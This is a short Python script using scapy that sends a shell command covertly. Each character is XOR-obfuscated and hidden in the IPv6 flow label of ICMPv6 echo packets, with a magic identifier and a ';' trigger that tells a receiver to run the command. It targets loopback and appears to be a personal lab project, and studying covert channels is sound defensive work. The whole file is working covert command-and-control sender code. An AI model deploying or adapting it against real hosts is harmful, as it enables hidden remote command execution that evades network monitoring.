from scapy.all import *
import time
import sys

TARGET_IP = "::1"  # Loopback
MAGIC_ID = 1114  # 12-bit Identifier (The "Secret Handshake") aka My Birthday=) (0x45A)
ENCRYPTION_KEY = 0x55  # XOR Key for obfuscation ( it's 85: just random pick)
TRIGGER_CHAR = ";"  # Signals "End of Command"


def send_covert_traffic(cmd):
    # Append the trigger character so the receiver knows when to execute
    full_message = cmd + TRIGGER_CHAR

    print(f"[*] Target: {TARGET_IP}")
    print(f"[*] Sending Command: '{cmd}'")
    print(f"[*] Packet Count: {len(full_message)}")

    for char in full_message:
        #1. Encryption
        ascii_val = ord(char) # for eg: 'l' → 108
        encrypted_char = ascii_val ^ ENCRYPTION_KEY # 108 XOR 85 = 61

        #2. Combine Magic ID and Data
        # Shift Magic ID 8 bits to the left, then OR with the char
        # [ 12-bit Magic ID ] + [ 8-bit Encrypted Char ]
        flow_label_val = (MAGIC_ID << 8) | encrypted_char
        #For eg -  'l':
        # 1114 << 8  = 0x45A00  = 0100 0101 1010 0000 0000
        #XOR'd 'l'  =    0x3D  =           0011 1101
        # = 0x45A3D  = 0100 0101 1010 0011 1101


        #3. Create IPv6 Packet with the crafted Flow Label
        pkt = IPv6(dst=TARGET_IP, fl=flow_label_val) / ICMPv6EchoRequest()

        # 4. TRANSMISSION
        send(pkt, verbose=False)

        # Small delay to ensure order
        time.sleep(0.02)
        sys.stdout.write(".")
        sys.stdout.flush()

    print("\n[+] Transmission Complete.")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        user_cmd = sys.argv[1]
    else:
        user_cmd = input("Enter command (e.g., 'ls -la'): ")

    send_covert_traffic(user_cmd)
